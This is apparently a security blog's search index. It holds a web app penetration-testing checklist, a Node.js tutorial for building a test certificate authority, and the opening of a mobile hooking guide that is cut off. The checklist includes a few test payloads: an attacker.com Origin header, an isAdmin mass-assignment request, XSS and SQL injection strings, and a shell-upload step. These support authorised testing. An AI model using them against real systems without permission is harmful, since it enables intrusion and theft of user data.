the HTTP response contains the wildcard CORS header. This may be desired in some applications, but is most often not required.Access-Control-Allow-Origin: * More info at MDN Web Docs: Access-Control-Allow-OriginCORS - Reflected OriginCheck if the HTTP response reflects the value provided in the Origin request header in the Access-Control-Allow-Origin response header. If the Access-Control-Allow-Credentials: true response header is also present, this can leaded to authenticated content being loaded cross-origin, as well as bypassing anti-CSRF tokens in certain cases.Request HeaderOrigin: https://attacker.comResponse HeaderAccess-Control-Allow-Origin: https://attacker.com More info at MDN Web Docs: Access-Control-Allow-OriginHSTS - MissingCheck that the HTTP Strict-Transport-Security (HSTS) header is present on all HTTP responses.Strict-Transport-Security: max-age=31536000; includeSubDomainsStrict-Transport-Security: max-age=63072000; includeSubDomains; preload 31536000 is 1 year expressed in seconds (60*60*24*365) 63072000 is 2 years expressed in seconds (60*60*24*365*2) (PREFERRED) More info at MDN Web Docs: Strict-Transport-SecurityHSTS - InsecureCheck for insecure configurations of the HSTS header. These include a max-age of 0 which effectively disables the control, or missing directives such as includeSubDomains or preload. Please note that the additional directives may not always be required.Strict-Transport-Security: max-age=0; includeSubDomainsStrict-Transport-Security: max-age=31536000CSP - MissingCheck that the Content-Security-Policy (CSP) header is present on HTTP responses that return HTML and JavaScript. The CSP header is required on JavaScript responses when using web workers as they do not inherit the Content-Security-Policy of the site. The CSP header is not required on other response types such as JSON or CSS. However, it does not hurt to include on all responses if the CSP header is small.Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt;Content-Security-Policy: default-src 'self'; connect-src 'none'; More info at MDN Web Docs: Content-Security-PolicyCSP - InsecureCheck if the Content-Security-Policy header contains 'unsafe-eval' or 'unsafe-inline'. These drastically reduce the protection CSP provides against XSS attacks and should NOT be included if possible.Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' 'unsafe-inline'; connect-src 'none';Referrer-Policy - MissingCheck that the Referrer-Policy header is present on HTTP responses that return HTML to minimise data leakage via the Referer header added by the browser.NOTE that referrer polices can also be added to HTML elements. See MDN Web Docs below for more info.Referrer-Policy: no-referrerReferrer-Policy: strict-origin More info at MDN Web Docs: Referrer-PolicyReferrer-Policy - InsecureCheck that the Referrer-Policy header is not set to an insecure setting. no-referrer is best, but other settings such as origin and strict-origin may be required depending on the application.Referrer-Policy: unsafe-urlReferrer-Policy: no-referrer-when-downgrade Examples at MDN Web Docs: Referrer-Policy#ExamplesX-XSS-Protection - MissingCheck if the X-XSS-Protection header is present. This header is mostly not used by modern browsers and is not required if a strong Content-Security-Policy is used that blocks inline JavaScript.X-XSS-Protection: 1X-XSS-Protection: 1; mode=block More info at MDN Web Docs: X-XSS-ProtectionX-XSS-Protection - InsecureCheck if the X-XSS-Protection header is present but has been configured to disable XSS filtering.X-XSS-Protection: 0Host Header InjectionCheck if the value in the Host request header is reflected in any location in the server response. This includes locations such as links and form submission locations.Header InjectionCheck if headers can be injected into the server response. A real world example of this happening: When sending OPTIONS requests to this particular server, the server reflected all the request headers as response headers. This could be used as a way of extract cookies using JavaScript because the Cookie header is not automatically removed from the HTTP response like the Set-Cookie header is.Duplicate HeadersCheck if the server responds with duplicate headers. This can happen normally if there is a load balancer, proxy, multiple API servers.Session &amp; CookiesMissing Attribute - SecureEnsure that all cookies used by the web application have the Secure attribute set. Some websites will have HTTP enabled so that a user can be redirected to the HTTPS version of the site. Cookies without the Secure flag can be sent during this first unencrypted HTTP request. Even tracking and non-session cookies should only be sent over HTTPS. The only exceptions are for sites that don’t use TLS, which should be rare.Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure More info at MDN Web Docs: Set-CookieMissing Attribute - HTTPOnlyEnsure that session cookies used by the web application have the HttpOnly attribute set. Cookies will this attribute set can not be accessed via JavaScript. Cookies without this attribute can be accessed by JavaScript and as a result can be stolen by an attacker if an XSS vulnerability exists in the application. Only non-sensitive cookies that need to be accessed by the front-end should be set without this attribute.Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly More info at MDN Web Docs: Set-CookieMissing Attribute - SameSiteEnsure that session cookies used by the web application have the SameSite attribute set and is not the value None. Cookies will this attribute set to Strict or Lax are more resistent to CSRF attacks as they will not be included in cross-origin requests. Using the Strict attribute is arguably simpler and more secure than using anti-CSRF tokens for most web applications as there is much less room for implementation errors.Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=StrictSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=LaxSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=None; Secure More info at MDN Web Docs: Set-CookiePath AttributeCheck if the Path attribute should be set for application’s session cookies. This attribute is not always required and having a value of Path=/ is not always an issue. Care should be given to this attribute if multiple applications are hosted on the same domain and/or if the application is not located at the root path (i.e. the web application is located at /application instead of at /).Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=/Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=/application More info at MDN Web Docs: Set-CookieConcurrent SessionsCheck if a user can have multiple sessions open at once using different browsers (or using Private-Mode). This may not be an issue for some web applications, depending on the application and sensitivity of the data being dealt with.Session TimeoutEnsure that the session is automatically invalided after a certain period of inactivity, normally 30 mins to 1 hour is standard. Note, this may not be desirable in some applications.Session TerminationEnsure that after a logout is performed, the cookie is actually invalidated and simply cleared.Session FixationEnsure after a successful login that a new session cookie is received from the server. The same session cookie that was given to a user pre-authentication SHOULD NOT be used post authentication.Session Cookie Not ChangingA rare extension of Session Fixation where the session cookie for a user is the same for every login. This can happen if the application uses the user’s ID (or similar) as a session cookie.Session Not Invalidated After Changing PasswordCheck if the user it logged out and has their session invalidated after changing their password.Decode CookiesAttempt to decode cookies values. Session cookies should be completely random and unpredictable. This is a GOOD session cookie WK0idcE45L7AB066B5B34tNZMLsmkGAx. This is a BAD session cookie VXNlcjpKb2huU21pdGg6MjAyMS0wOS0yODoyMi0xNi01Mg. (I’ll let you figure out why).Lack of Logout FunctionalityEnsure the application has an explicit logout button that invalidates a user’s session.AuthenticationLogin with no PasswordAttempt to login to the application without using a password. This should be checked on the front-end and through an interception proxy as most apps won’t submit an empty password on login.Lack of MFACheck if the application requires MFA to login. Some applications may not require MFA such as low risk internal applications. Internet facing applications should almost always support MFA.Account LockoutVerify that a user’s account gets locked out after a certain number of incorrect attempts. This is to prevent the bruteforcing of passwords.Account Lockout on Change PasswordVerify that a user’s account gets locked out after a certain number of incorrect attempts at changing a user’s password.No MFA LockoutVerify that the user account get’s locked out and/or the OTP code is invalidated if the OTP code is brute forced.MFA BypassIf a well known solution is used, check online for known bypasses.Common techniques include: OTP is not actually required at all, the server has just told us OTP is required. Server responses can be modified and the front-end can send us to the application. I.e. the server might respond with {\"success\":false} after a successful username &amp; password auth. Changing this to {\"success\":true} may trick the front-end into sending additional requests or redirecting to the application without needing the OTP code. Forcefully browsing to the application after being presented with the OTP screen. This can happen if the user is actually logged in after providing the username &amp; password, and providing a correct OTP acts as a redirect. No bruteforce protection in place OTP codes from other users. OTP codes should only work for one user. I.e. OTP codes sent to user A, should not work for User B. OTP code reuse. Check if previously used OTP still work. Only one code should work at a time, all other codes should be invalidated. Client-side validation. OTP code returned to the front-end and the OTP check only happens client-side.User Enumeration - Error BasedVerify the application returns the same message on a failed login attempt when using a valid and invalid username. If usernames can be enumerated, password spraying can be done against the application with a much higher chance of success. GOOD error message The Username/Password is Incorrect. BAD error message Username does not exist.User Enumeration - Time BasedVerify the application takes the same amount of time to return an error message when a valid and invalid username is provided.An example of how this can go wrong: Username is checked if it’s in the Database If the username is invalid then return an error message. If the username is valid then check the password hash (this can take a second or two if bcrypt with multiple rounds is used). If password is wrong return an error message.Because hashing can sometimes take a noticeable amount of time, a valid and invalid user can be enumerated based on the response time.Password StrengthEnsure the application has a password complexity requirement so as to not allow very weak passwords such as a. As an extension, common weak passwords such as Password1, Welcome1!, Qwerty@123 that technically meet the application’s password complexity requirements should be blacklisted.Password HistoryEnsure the application enforces a password history. A user should not be able to change their password to one of their previous few passwords.Case Insensitive PasswordEnsure the application checks the case of passwords that are entered. There may be limitation on very old systems &amp; mainframes, but this is not the case for modern systems.Client-Side Password RequirementsEnsure the password complexity requirement is enforced server-side as well as client-side. Use an interception proxy to change the password to ensure the application doesn’t solely rely on client-side controls.Password Not Required to Change PasswordEnsure that the current password is required to update a user’s password. This is a requirement so that accounts that have been temporarily taken over (perhaps via a leaked session cookie, or leaving a computer unattended) are harder to fully take over. If an attacker only has a victim’s session token, and not their password, then the attack’s access should be limited to the session only. If they can change the password without the current password, then they can fully take over the account and lock the victim out.Use of Basic AuthenticationEnsure the application does not use Basic Authentication. Basic Auth sends the username and password in every request, increasing the likelihood that they will be leaked. In addition, using Basic Auth provides no effective session management.No Method to Change PasswordCheck if the application has functionality to change a user’s password.User Account DoSVerify if the reset password functionality immediately invalidates a user’s current password. If so then a user can be DoS’d by an attacker by only knowing their username. An more secure method is for a user to be sent a reset link, asked to answer security questions, then prompted to enter a new password.AuthorisationRemove Cookies ONE at a timeRemove one cookie at a time to check what cookies are actually required for a request to succeed. It’s common for web applications to only have one session cookie, and the rest are for tracking and/or application settings/options.Remove ALL Cookies and/or TokensVerify that APIs actually require a cookie or auth token to be accessed. I.e. it can’t be access without authorisation.JWT ChecksIf the application uses JWTs, verify they have been implemented correctly. This may be useful JWT Fuzzer Tool.Unauthorised Data AccessEnsure users can not access data that is not accessable to them via the UI. If a user has some documents assigned to them that they can see, attempt to access other documents that are not assigned to the user. This also includes update and deleting data that has not been specifically assigned to a user.Unauthorised API AccessEnsure lower privilege users don’t have access to resources they shouldn’t. If only Admins can access /userlist, ensure low privilege users can not. This differs from the previous point as here we are talking about entire endpoints and/or sections of the application that shouldn’t be accessed.Horizontal Privilege EscalationAttempt to perform actions on resources of other users at the same level. E.g. If User 1 can only access Document ABC, and User 2 can access Document DEF and GHI, attempt to perform CRUD operations on documents DEF and GHI even if it’s not possible through the UI.Vertical Privilege EscalationAttempt to perform actions on resources that required a higher privilege level (e.g. Admin or Manager privilege).Forceful BrowsingAttempt to directly access files that are in the web root folder that are not listed by the application and see if these are accessable. Examples include: Config files Environment files Uploaded files through the applicationCSRFAttempt to perform a cross-site request forgery (CSRF) attack with a PoC and prove it’s possible. Even if it looks like it should work, verify it actually does.CSWSHIf the application uses web-sockets, attempt to perform a cross-site web socket hijacking (CSWSH) attack. Ensure either the session cookie has a SameSite value that isn’t None, and/or the web-socket upgrade request Origin header is validated, as this is a restricted header that can’t be modified in the browser.Data StorageSensitive CookiesVerify that sensitive information is not stored in cookie values or as cookie names. Examples include passwords/secrets that are persistent and rarely (if ever) change.Session StorageCheck the browser Session Storage for sensitive information. Session Storage can be accessed via JavaScript meaning any data stored here is accessable to an attacker via an XSS attack.Session Storage can be accessed in JavaScript using sessionStorage. A specific item in Session Storage can be retrieved using sessionStorage.getItem('keyName').Local StorageCheck the browser Local Storage for sensitive information. Local Storage can be accessed via JavaScript meaning any data stored here is accessable to an attacker via an XSS attack. Local Storage differs from Session Storage as it is persistent across page and browser reloads (assuming not in Private-Mode).Local Storage can be accessed in JavaScript using localStorage. A specific item in Local Storage can be retrieved using localStorage.getItem('keyName').Window ObjectCheck the global window object for any sensitive data that may be stored there. The window object is a globally accessable location by JavaScript executing on the front-end. It can be a convenient place to store information, but can lead to insecurities if used incorrectly to store sensitive data. The window object is accessable to an attacker via an XSS attack, therefore is not a safe place to store sensitive data. The window object can be access using window. The data stored in window can be view more cleanly using Object.entries(window).Returned DataWARNING this check is HIGHLY application specific and should be judged on an app by app basis.Ensure the data returned in HTML pages and via APIs do not contain unnecessary sensitive data. An example would be returning passwords or password hashes to a user. This type of information is not required for a majority of cases and a user (and admin in most cases) should not be able to see their password after it has been set.Input ValidationLack of ValidationEnsure that fields only support the type of data that is expected. This can lead to numerous issues, notably XSS and SQLi. Some examples: Check Phone Number fields only supports Numbers, Plus sign and whitespace. Check fields like names don’t support special characters if not required such as &lt;&gt;()[]{}\"'~\\/?%$ Sort direction fields that normally only contain asc or desc.Client-Side ValidationEnsure that the application does not rely on Client-side validation ONLY. Client-side validation is perfectly fine and is necessary for a good user experience, but validation must be performed Server-side as well.Reflected ParametersCheck if parameters provided in a request are reflected in the response. A common example would be a query parameter that is reflected in the response HTML and not escaped properly. This can lead to Reflected XSS.CSV InjectionIf the application has functionality that allows data to exported to a CSV file, check if CSV injection payloads can be included in the output document.Output EncodingEnsure special characters are correctly escaped when they are displayed. Some Examples: &lt; as &amp;lt; &gt; as &amp;gt; \" as &amp;quot;Attempt to bypass the escaping using different encodings.Error MessagesCheck if the application returns descriptive Errors and/or Stack Traces if invalid input is provided. Query parameters, Body parameters, Tokens, Cookies and Header values should all be fuzzed for this.Parameter PollutionAdd multiple query parameters with the same name and see how the server handles it. Different server software will handle this differently (some take the first value, some the last, some concatenate all of them).Mass AssignmentAdd additional unexpected keys to requests and see if the server accepts them. This can happen if the entire JSON object is used when preforming a Database operation, instead of copying out the required keys. It can also happen if no validation is done on the provided data (not checking that only the required keys were provided and no others). Example:POST /register HTTP/1.1...{\"email\":\"user1@test.com\"}HTTP/1.1 200 OK...{\"email\":\"user1@test.com\",\"userId\":\"abcefg\",\"isAdmin\":false}Try adding the isAdmin key to the initial request:POST /register HTTP/1.1...{\"email\":\"user2@test.com\",\"isAdmin\":true}HTTP/1.1 200 OK...{\"email\":\"user2@test.com\",\"userId\":\"123456\",\"isAdmin\":true}File UploadVerify file upload functionality works as intended: User should not be able to control where the file is stored on the server. Accepted file types and size should be enforced server-side. Check if Anti-virus is installed on the Server (EICAR). Check if files are stored on disk (they might be stored in the DB, or elsewhere). Check if uploaded files are in a simple location like /upload/my-uploaded-file.aspx. Upload Shell if applicable.Directory TraversalCheck if files outside of the web root can be accessed. This occurs when no validation is performed on the path and file that is trying to be accessed.Server ConfigurationDirectory ListingCheck if there is Directory Listing on the web server which enables a user to see the files on server. This should rarely ever be required for a web application, except for a simple file share server.TLS ConfigurationCheck the TLS configuration of the application and see if older SSL/TLS versions are supported like SSLv2, SSLv3, TLSv1.0 and TLSv1.1. Check for weak ciphers and other insecure settings. Use a tool like SSLScan or TestSSL.Wildcard CertificateCheck if the certificate used by the web application is a wildcard certificate. Wildcard certificates are not any less secure cryptographically, however, if compromised they are a bigger risk as the certificate is valid for multiple domains.TRACE Method EnabledCheck if web server supports the HTTP TRACE method. Replace methods such as GET or POST with TRACE and see if the request data is reflected in the server response. This is almost unexploitable now due to browsers no longer supporting the TRACE method for security reasons (Cross-Site Tracing).Outdated Libraries in UseCheck for outdated libraries/software used by the web application. Common outdated software includes: jQuery Bootstrap React Angular Tomcat IIS &amp; ASP.NET PHPSensitive Information in URLEnsure no sensitive information is sent in the URL. This includes data such as Passwords, API keys and Session Tokens. URLs can be stored in browser history, caches, and leaked via Referer header.Lack of Subresource Integrity ChecksEnsure cross-origin resources contain integrity checks. Loading scripts cross-origin can increase the attack surface of an application. Should that cross-origin resource be compromised, an attacker now has an additional pathway into the application.&lt;script src=\"https://test.com/special-library.js\" integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; More info at MDN Web Docs: Subresource IntegrityLack of HTTPSEnsure the website utilises TLS and doesn’t perform actions unencrypted over HTTP.Use of HTTP (no TLS)Ensure the website can not be used over HTTP and instead must be used over HTTPS. Servers often support HTTP (no TLS) and will immediately redirect to a HTTPS version of the application. This is okay, however it becomes an issue if application functionality can be performed over unencrypted communication.A server that supports HTTP and HTTPS has the following issue: Use of HTTP (no TLS)A server that supports HTTP, but NOT HTTPS has the following issues: Use of HTTP (no TLS) Lack of HTTPSSequential IDsCheck the application doesn’t use sequential ID numbers for resources. If you create a document in the application and it has an ID of 3074, create another one and see if the number is slightly higher or is the next number in the sequence. Having sequential ID numbers makes resources much easier to enumerate. ID numbers should be long and completely random.No WAFCheck if common attack payloads get blocked by a Web Application Firewall (WAF). Sending requests with such payloads should result in a different error screen or a 500 response with no information.Common attack payloads that should get blocked: &lt;script&gt;alert(1)&lt;/script&gt; &lt;script&gt;alert(document.cookie)&lt;/script&gt; SELECT @@version ’ UNION SELECT 1,2,3–POST Requests as GET RequestsAttempt to change POST requests to GET requests to see if the server accepts the parameters as query parameters instead.Rate LimitingCheck if the server implements any sort of rate limiting to prevent DoS, or brute forcing.Database StorageEnsure the database stores hashed information were possible. Passwords should never be stored in plain-text and should be hashed using bcrypt to mitigate brute forcing in the event of compromise. User session tokens should also be hashed for the same reason." }, { "title": "Certificate Generate Pure NodeJS", "url": "/posts/certificate-generation-pure-nodejs/", "categories": "security, web", "tags": "web, http, https, security, certificates, ca, cryptography", "date": "2021-09-21 00:07:50 +1000", "snippet": "This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node...", "content": "This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node-forge npm module. This post will assume you are familiar with Certificates Authorities and Host Certificates already. There is not much explanation given as the code is well documented. Install Package Setup Generating a Certificate Authority Generating a Host Certificate Full CodeInstall PackageFirst step is to install the required npm package:npm i node-forgeSetupTo start with we’ll need some helper functions for creating valid serial numbers, and also for generating the notBefore and notAfter dates. We will also define some constants that will be included in all the certificates (Country, State, Locality), as well as a boilerplate class with two methods we will fill in later.const forge = require('node-forge');const makeNumberPositive = (hexString) =&gt; {\tlet mostSignificativeHexDigitAsInt = parseInt(hexString[0], 16);\tif (mostSignificativeHexDigitAsInt &lt; 8) return hexString;\tmostSignificativeHexDigitAsInt -= 8\treturn mostSignificativeHexDigitAsInt.toString() + hexString.substring(1)}// Generate a random serial number for the Certificateconst randomSerialNumber = () =&gt; {\treturn makeNumberPositive(forge.util.bytesToHex(forge.random.getBytesSync(20)));}// Get the Not Before Date for a Certificate (will be valid from 2 days ago)const getCertNotBefore = () =&gt; {\tlet twoDaysAgo = new Date(Date.now() - 60*60*24*2*1000);\tlet year = twoDaysAgo.getFullYear();\tlet month = (twoDaysAgo.getMonth() + 1).toString().padStart(2, '0');\tlet day = twoDaysAgo.getDate();\treturn new Date(`${year}-${month}-${day} 00:00:00Z`);}// Get Certificate Expiration Date (Valid for 90 Days)const getCertNotAfter = (notBefore) =&gt; {\tlet ninetyDaysLater = new Date(notBefore.getTime() + 60*60*24*90*1000);\tlet year = ninetyDaysLater.getFullYear();\tlet month = (ninetyDaysLater.getMonth() + 1).toString().padStart(2, '0');\tlet day = ninetyDaysLater.getDate();\treturn new Date(`${year}-${month}-${day} 23:59:59Z`);}// Get CA Expiration Date (Valid for 100 Years)const getCANotAfter = (notBefore) =&gt; {\tlet year = notBefore.getFullYear() + 100;\tlet month = (notBefore.getMonth() + 1).toString().padStart(2, '0');\tlet day = notBefore.getDate();\treturn new Date(`${year}-${month}-${day} 23:59:59Z`);}const DEFAULT_C = 'Australia';const DEFAULT_ST = 'Victoria';const DEFAULT_L = 'Melbourne';class CertificateGeneration {\tstatic CreateRootCA() {}\tstatic CreateHostCert(hostCertCN, validDomains, rootCAObject) {}}Generating a Certificate Authoritystatic CreateRootCA() {\t// Create a new Keypair for the Root CA\tconst { privateKey, publicKey } = forge.pki.rsa.generateKeyPair(2048);\t// Define the attributes for the new Root CA\tconst attributes = [{\t\tshortName: 'C',\t\tvalue: DEFAULT_C\t}, {\t\tshortName: 'ST',\t\tvalue: DEFAULT_ST\t}, {\t\tshortName: 'L',\t\tvalue: DEFAULT_L\t}, {\t\tshortName: 'CN',\t\tvalue: 'My Custom Testing RootCA'\t}];\tconst extensions = [{\t\tname: 'basicConstraints',\t\tcA: true\t}, {\t\tname: 'keyUsage',\t\tkeyCertSign: true,\t\tcRLSign: true\t}];\t// Create an empty Certificate\tconst cert = forge.pki.createCertificate();\t// Set the Certificate attributes for the new Root CA\tcert.publicKey = publicKey;\tcert.privateKey = privateKey;\tcert.serialNumber = randomSerialNumber();\tcert.validity.notBefore = getCertNotBefore();\tcert.validity.notAfter = getCANotAfter(cert.validity.notBefore);\tcert.setSubject(attributes);\tcert.setIssuer(attributes);\tcert.setExtensions(extensions);\t// Self-sign the Certificate\tcert.sign(privateKey, forge.md.sha512.create());\t// Convert to PEM format\tconst pemCert = forge.pki.certificateToPem(cert);\tconst pemKey = forge.pki.privateKeyToPem(privateKey);\t// Return the PEM encoded cert and private key\treturn { certificate: pemCert, privateKey: pemKey, notBefore: cert.validity.notBefore, notAfter: cert.validity.notAfter };}Generating a Host Certificatestatic CreateHostCert(hostCertCN, validDomains, rootCAObject) {\tif (!hostCertCN.toString().trim()) throw new Error('\"hostCertCN\" must be a String');\tif (!Array.isArray(validDomains)) throw new Error('\"validDomains\" must be an Array of Strings');\tif (!rootCAObject || !rootCAObject.hasOwnProperty('certificate') || !rootCAObject.hasOwnProperty('privateKey')) throw new Error('\"rootCAObject\" must be an Object with the properties \"certificate\" &amp; \"privateKey\"');\t// Convert the Root CA PEM details, to a forge Object\tlet caCert = forge.pki.certificateFromPem(rootCAObject.certificate);\tlet caKey = forge.pki.privateKeyFromPem(rootCAObject.privateKey);\t// Create a new Keypair for the Host Certificate\tconst hostKeys = forge.pki.rsa.generateKeyPair(2048);\t// Define the attributes/properties for the Host Certificate\tconst attributes = [{\t\tshortName: 'C',\t\tvalue: DEFAULT_C\t}, {\t\tshortName: 'ST',\t\tvalue: DEFAULT_ST\t}, {\t\tshortName: 'L',\t\tvalue: DEFAULT_L\t}, {\t\tshortName: 'CN',\t\tvalue: hostCertCN\t}];\tconst extensions = [{\t\tname: 'basicConstraints',\t\tcA: false\t}, {\t\tname: 'nsCertType',\t\tserver: true\t}, {\t\tname: 'subjectKeyIdentifier'\t}, {\t\tname: 'authorityKeyIdentifier',\t\tauthorityCertIssuer: true,\t\tserialNumber: caCert.serialNumber\t}, {\t\tname: 'keyUsage',\t\tdigitalSignature: true,\t\tnonRepudiation: true,\t\tkeyEncipherment: true\t}, {\t\tname: 'extKeyUsage',\t\tserverAuth: true\t}, {\t\tname: 'subjectAltName',\t\taltNames: validDomains.map(domain =&gt; { return { type: 2, value: domain } })\t}];\t// Create an empty Certificate\tlet newHostCert = forge.pki.createCertificate();\t// Set the attributes for the new Host Certificate\tnewHostCert.publicKey = hostKeys.publicKey;\tnewHostCert.serialNumber = randomSerialNumber();\tnewHostCert.validity.notBefore = getCertNotBefore();\tnewHostCert.validity.notAfter = getCertNotAfter(newHostCert.validity.notBefore);\tnewHostCert.setSubject(attributes);\tnewHostCert.setIssuer(caCert.subject.attributes);\tnewHostCert.setExtensions(extensions);\t// Sign the new Host Certificate using the CA\tnewHostCert.sign(caKey, forge.md.sha512.create());\t// Convert to PEM format\tlet pemHostCert = forge.pki.certificateToPem(newHostCert);\tlet pemHostKey = forge.pki.privateKeyToPem(hostKeys.privateKey);\treturn { certificate: pemHostCert, privateKey: pemHostKey, notAfter: newHostCert.validity.notBefore, notAfter: newHostCert.validity.notAfter };}Full Codeconst forge = require('node-forge');const makeNumberPositive = (hexString) =&gt; {\tlet mostSignificativeHexDigitAsInt = parseInt(hexString[0], 16);\tif (mostSignificativeHexDigitAsInt &lt; 8) return hexString;\tmostSignificativeHexDigitAsInt -= 8\treturn mostSignificativeHexDigitAsInt.toString() + hexString.substring(1)}// Generate a random serial number for the Certificateconst randomSerialNumber = () =&gt; {\treturn makeNumberPositive(forge.util.bytesToHex(forge.random.getBytesSync(20)));}// Get the Not Before Date for a Certificate (will be valid from 2 days ago)const getCertNotBefore = () =&gt; {\tlet twoDaysAgo = new Date(Date.now() - 60*60*24*2*1000);\tlet year = twoDaysAgo.getFullYear();\tlet month = (twoDaysAgo.getMonth() + 1).toString().padStart(2, '0');\tlet day = twoDaysAgo.getDate();\treturn new Date(`${year}-${month}-${day} 00:00:00Z`);}// Get Certificate Expiration Date (Valid for 90 Days)const getCertNotAfter = (notBefore) =&gt; {\tlet ninetyDaysLater = new Date(notBefore.getTime() + 60*60*24*90*1000);\tlet year = ninetyDaysLater.getFullYear();\tlet month = (ninetyDaysLater.getMonth() + 1).toString().padStart(2, '0');\tlet day = ninetyDaysLater.getDate();\treturn new Date(`${year}-${month}-${day} 23:59:59Z`);}// Get CA Expiration Date (Valid for 100 Years)const getCANotAfter = (notBefore) =&gt; {\tlet year = notBefore.getFullYear() + 100;\tlet month = (notBefore.getMonth() + 1).toString().padStart(2, '0');\tlet day = notBefore.getDate();\treturn new Date(`${year}-${month}-${day} 23:59:59Z`);}const DEFAULT_C = 'Australia';const DEFAULT_ST = 'Victoria';const DEFAULT_L = 'Melbourne';class CertificateGeneration {\tstatic CreateRootCA() {\t\t// Create a new Keypair for the Root CA\t\tconst { privateKey, publicKey } = forge.pki.rsa.generateKeyPair(2048);\t\t// Define the attributes for the new Root CA\t\tconst attributes = [{\t\t\tshortName: 'C',\t\t\tvalue: DEFAULT_C\t\t}, {\t\t\tshortName: 'ST',\t\t\tvalue: DEFAULT_ST\t\t}, {\t\t\tshortName: 'L',\t\t\tvalue: DEFAULT_L\t\t}, {\t\t\tshortName: 'CN',\t\t\tvalue: 'My Custom Testing RootCA'\t\t}];\t\tconst extensions = [{\t\t\tname: 'basicConstraints',\t\t\tcA: true\t\t}, {\t\t\tname: 'keyUsage',\t\t\tkeyCertSign: true,\t\t\tcRLSign: true\t\t}];\t\t// Create an empty Certificate\t\tconst cert = forge.pki.createCertificate();\t\t// Set the Certificate attributes for the new Root CA\t\tcert.publicKey = publicKey;\t\tcert.privateKey = privateKey;\t\tcert.serialNumber = randomSerialNumber();\t\tcert.validity.notBefore = getCertNotBefore();\t\tcert.validity.notAfter = getCANotAfter(cert.validity.notBefore);\t\tcert.setSubject(attributes);\t\tcert.setIssuer(attributes);\t\tcert.setExtensions(extensions);\t\t// Self-sign the Certificate\t\tcert.sign(privateKey, forge.md.sha512.create());\t\t// Convert to PEM format\t\tconst pemCert = forge.pki.certificateToPem(cert);\t\tconst pemKey = forge.pki.privateKeyToPem(privateKey);\t\t// Return the PEM encoded cert and private key\t\treturn { certificate: pemCert, privateKey: pemKey, notBefore: cert.validity.notBefore, notAfter: cert.validity.notAfter };\t}\tstatic CreateHostCert(hostCertCN, validDomains, rootCAObject) {\t\tif (!hostCertCN.toString().trim()) throw new Error('\"hostCertCN\" must be a String');\t\tif (!Array.isArray(validDomains)) throw new Error('\"validDomains\" must be an Array of Strings');\t\tif (!rootCAObject || !rootCAObject.hasOwnProperty('certificate') || !rootCAObject.hasOwnProperty('privateKey')) throw new Error('\"rootCAObject\" must be an Object with the properties \"certificate\" &amp; \"privateKey\"');\t\t// Convert the Root CA PEM details, to a forge Object\t\tlet caCert = forge.pki.certificateFromPem(rootCAObject.certificate);\t\tlet caKey = forge.pki.privateKeyFromPem(rootCAObject.privateKey);\t\t// Create a new Keypair for the Host Certificate\t\tconst hostKeys = forge.pki.rsa.generateKeyPair(2048);\t\t// Define the attributes/properties for the Host Certificate\t\tconst attributes = [{\t\t\tshortName: 'C',\t\t\tvalue: DEFAULT_C\t\t}, {\t\t\tshortName: 'ST',\t\t\tvalue: DEFAULT_ST\t\t}, {\t\t\tshortName: 'L',\t\t\tvalue: DEFAULT_L\t\t}, {\t\t\tshortName: 'CN',\t\t\tvalue: hostCertCN\t\t}];\t\tconst extensions = [{\t\t\tname: 'basicConstraints',\t\t\tcA: false\t\t}, {\t\t\tname: 'nsCertType',\t\t\tserver: true\t\t}, {\t\t\tname: 'subjectKeyIdentifier'\t\t}, {\t\t\tname: 'authorityKeyIdentifier',\t\t\tauthorityCertIssuer: true,\t\t\tserialNumber: caCert.serialNumber\t\t}, {\t\t\tname: 'keyUsage',\t\t\tdigitalSignature: true,\t\t\tnonRepudiation: true,\t\t\tkeyEncipherment: true\t\t}, {\t\t\tname: 'extKeyUsage',\t\t\tserverAuth: true\t\t}, {\t\t\tname: 'subjectAltName',\t\t\taltNames: validDomains.map(domain =&gt; { return { type: 2, value: domain } })\t\t}];\t\t// Create an empty Certificate\t\tlet newHostCert = forge.pki.createCertificate();\t\t// Set the attributes for the new Host Certificate\t\tnewHostCert.publicKey = hostKeys.publicKey;\t\tnewHostCert.serialNumber = randomSerialNumber();\t\tnewHostCert.validity.notBefore = getCertNotBefore();\t\tnewHostCert.validity.notAfter = getCertNotAfter(newHostCert.validity.notBefore);\t\tnewHostCert.setSubject(attributes);\t\tnewHostCert.setIssuer(caCert.subject.attributes);\t\tnewHostCert.setExtensions(extensions);\t\t// Sign the new Host Certificate using the CA\t\tnewHostCert.sign(caKey, forge.md.sha512.create());\t\t// Convert to PEM format\t\tlet pemHostCert = forge.pki.certificateToPem(newHostCert);\t\tlet pemHostKey = forge.pki.privateKeyToPem(hostKeys.privateKey);\t\treturn { certificate: pemHostCert, privateKey: pemHostKey, notAfter: newHostCert.validity.notBefore, notAfter: newHostCert.validity.notAfter };\t}}let CA = CertificateGeneration.CreateRootCA();/* The following certificate:\t- Will be called 'testing.com'.\t- Will be valid for 'testing.com' and 'test.com'.\t- Will be signed by the CA we just created above.*/let hostCert = CertificateGeneration.CreateHostCert('testing.com', ['testing.com', 'test.com'], CA);console.log(CA.certificate);console.log(hostCert.certificate);" }, { "title": "Objection Quick Start", "url": "/posts/objection-quick-start/", "categories": "security, mobile", "tags": "security, mobile, ios, android, frida, objection", "date": "2021-09-15 20:51:10 +1000", "snippet": " Setup Install Objection Test Objection Find Application Attach to Application Android &amp; iOS Files HTTP Server Hooking Other Andro...", "content": " Setup Install Objection Test Objection Find Application Attach to Application Android &amp; iOS Files HTTP Server Hooking Other Android SSLPinning &amp; Root Detection Android Hooking iOS SSLPinning &amp; Jailbreak 